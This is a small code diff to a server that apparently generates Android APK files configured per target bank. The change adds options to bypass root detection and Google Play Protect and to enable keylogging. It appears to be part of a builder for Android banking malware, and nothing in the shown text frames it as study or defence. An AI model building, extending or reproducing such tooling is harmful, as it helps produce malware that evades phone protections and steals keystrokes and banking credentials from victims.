@@ -223,6 +223,9 @@ async function startServer() {
         bankId: job?.bankId ?? "default",
         bankCountry: job?.bankCountry ?? "BR",
         bankName: job?.bankName ?? "Default Bank",
+        enableRootBypass: job?.enableRootBypass,
+        enablePlayProtectBypass: job?.enablePlayProtectBypass,
+        enableKeylogCapture: job?.enableKeylogCapture,
       });
 
       res.setHeader("Content-Type", "application/vnd.android.package-archive");
